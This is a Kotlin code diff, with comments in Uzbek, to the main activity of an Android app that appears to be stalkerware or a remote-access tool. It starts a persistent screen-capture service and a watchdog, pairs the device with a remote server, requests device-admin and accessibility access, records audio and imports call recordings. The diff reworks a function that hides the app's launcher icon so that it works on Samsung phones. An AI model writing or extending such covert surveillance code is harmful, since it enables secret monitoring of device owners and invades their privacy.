@@ -4,6 +4,7 @@ import android.Manifest
 import android.app.Activity
 import android.app.AlarmManager
 import android.app.admin.DevicePolicyManager
+import android.content.ComponentName
 import android.content.Intent
 import android.content.pm.PackageManager
 import android.media.projection.MediaProjectionManager
@@ -32,7 +33,12 @@ class MainActivity : AppCompatActivity() {
     private lateinit var tvPairing: TextView
     private lateinit var tvStatus: TextView
     private lateinit var dpm: DevicePolicyManager
-    private lateinit var adminComp: android.content.ComponentName
+    private lateinit var adminComp: ComponentName
+
+    // Alias nomi — Manifest dagi activity-alias nomi bilan mos bo'lishi kerak
+    private val launcherAlias by lazy {
+        ComponentName(packageName, "$packageName.LauncherAlias")
+    }
 
     private val screenLauncher = registerForActivityResult(
         ActivityResultContracts.StartActivityForResult()
@@ -98,7 +104,7 @@ class MainActivity : AppCompatActivity() {
         super.onCreate(savedInstanceState)
 
         dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
-        adminComp = android.content.ComponentName(this, DeviceAdminReceiver::class.java)
+        adminComp = ComponentName(this, DeviceAdminReceiver::class.java)
 
         val root = LinearLayout(this).apply {
             orientation = LinearLayout.VERTICAL
@@ -127,17 +133,17 @@ class MainActivity : AppCompatActivity() {
 
         setContentView(root)
 
-        // ✅ 1) Darhol heartbeat uchun serviceni ishga tushiramiz
+        // ✅ Heartbeat uchun serviceni darhol ishga tushiramiz
         ContextCompat.startForegroundService(
             this,
             Intent(this, ScreenCaptureService::class.java)
                 .putExtra("deviceId", deviceId)
         )
 
-        // ✅ 2) Watchdog alarmni o'rnatamiz
+        // ✅ Watchdog alarmni o'rnatamiz
         WatchdogReceiver.schedule(this)
 
-        // ✅ 3) Pairing kodni ekranda ko'rsatamiz
+        // ✅ Pairing kodni ekranda ko'rsatamiz
         tvPairing.text = "Device ID: $deviceId\nServerga ulanmoqda..."
         thread {
             try {
@@ -159,6 +165,43 @@ class MainActivity : AppCompatActivity() {
         if (::tvStatus.isInitialized) tvStatus.text = msg
     }
 
+    // ✅ Ikonkani yashirish — alias orqali (Samsung S22 da to'liq ishlaydi)
+    private fun hideAppIcon() {
+        try {
+            val isAlreadyHidden = packageManager.getComponentEnabledSetting(launcherAlias) ==
+                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED
+
+            if (isAlreadyHidden) {
+                setStatus("ℹ️ Ikonka allaqachon yashirilgan")
+                return
+            }
+
+            packageManager.setComponentEnabledSetting(
+                launcherAlias,
+                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+                PackageManager.DONT_KILL_APP
+            )
+
+            setStatus("✅ Ikonka yashirildi\n(Launcher yangilanguncha 5-10 soniya kuting)")
+        } catch (e: Exception) {
+            setStatus("❌ Xatolik: ${e.message}")
+        }
+    }
+
+    // Ikonkani qayta ko'rsatish (kerak bo'lsa)
+    private fun showAppIcon() {
+        try {
+            packageManager.setComponentEnabledSetting(
+                launcherAlias,
+                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
+                PackageManager.DONT_KILL_APP
+            )
+            setStatus("✅ Ikonka qayta ko'rsatildi")
+        } catch (e: Exception) {
+            setStatus("❌ Xatolik: ${e.message}")
+        }
+    }
+
     private fun importCallRecording() { callRecordingPicker.launch(arrayOf("audio/*")) }
 
     private fun requestAccessibility() {
@@ -168,22 +211,11 @@ class MainActivity : AppCompatActivity() {
         startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
     }
 
-    private fun hideAppIcon() {
-        try {
-            packageManager.setComponentEnabledSetting(
-                componentName,
-                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP
-            )
-            setStatus("✅ Ilova ikonkasi yashirildi")
-        } catch (e: Exception) {
-            setStatus("❌ Ikonkani yashirishda xatolik: ${e.message}")
-        }
-    }
-
     private fun requestScreen() {
-        val manager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
-        screenLauncher.launch(manager.createScreenCaptureIntent())
+        screenLauncher.launch(
+            (getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager)
+                .createScreenCaptureIntent()
+        )
     }
 
     private fun requestCamera() {
@@ -204,14 +236,16 @@ class MainActivity : AppCompatActivity() {
         }
         try {
             ContextCompat.startForegroundService(this,
-                Intent(this, AudioRecordingService::class.java).setAction(AudioRecordingService.ACTION_START))
+                Intent(this, AudioRecordingService::class.java)
+                    .setAction(AudioRecordingService.ACTION_START))
             setStatus("🔴 Audio yozish boshlandi")
         } catch (_: Exception) { setStatus("❌ Audio yozishni boshlashda xatolik") }
     }
 
     private fun stopAudioRecording() {
         try {
-            startService(Intent(this, AudioRecordingService::class.java).setAction(AudioRecordingService.ACTION_STOP))
+            startService(Intent(this, AudioRecordingService::class.java)
+                .setAction(AudioRecordingService.ACTION_STOP))
             setStatus("⏹️ Audio yozish to'xtatildi")
         } catch (_: Exception) { setStatus("❌ Audio yozishni to'xtatishda xatolik") }
     }
